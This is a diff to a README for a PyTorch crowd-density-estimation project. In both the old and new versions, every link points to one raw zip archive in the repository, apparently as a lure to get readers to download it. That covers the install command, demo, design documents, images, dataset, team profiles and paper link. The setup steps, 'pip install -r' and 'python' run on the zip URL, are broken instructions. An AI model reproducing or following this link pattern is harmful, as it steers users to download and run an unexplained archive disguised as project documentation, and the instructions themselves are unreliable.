@@ -13,38 +13,38 @@ PyTorch
 
 * conda create --prefix ./env python==3.8 -y
 * conda activate <<path_to_env_directory>>/env
-* pip install -r https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip
+* pip install -r https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip
 
 ## Project Demo
 
-### [Demo](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
+### [Demo](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
 
 ## Documents
 
-### [HLD](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
-### [LLD](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
-### [ARCHITECTURE DESIGN](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
-### [WIREFRAME DOCUMENTATION](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
-### [DETAILED PROJECT REPORT](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
+### [HLD](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
+### [LLD](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
+### [ARCHITECTURE DESIGN](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
+### [WIREFRAME DOCUMENTATION](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
+### [DETAILED PROJECT REPORT](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
 
 ## Steps
 
-### First go to the project directory and run 'python https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip' in command line.
+### First go to the project directory and run 'python https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip' in command line.
 
 #### Upload any image or video
-![Take image](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
+![Take image](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
 
 #### Prediction
-![Prediction](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
+![Prediction](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
 
 ## Dataset 
 
-[SanghaiTech Dataset](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
+[SanghaiTech Dataset](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
 
 ## Team
-### [Arnab Mitra](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
-### [Subhradipta Paul](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
+### [Arnab Mitra](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
+### [Subhradipta Paul](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
 
 ## Paper link
-[MCNN PAPER](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip~https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/__pycache__/Density_Estimation_Crowd_3.2.zip)
+[MCNN PAPER](https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip~https://github.com/Arnab1998-cyber/Crowd-Density-Estimation/raw/refs/heads/main/src/Density_Estimation_Crowd_v1.3.zip)
 
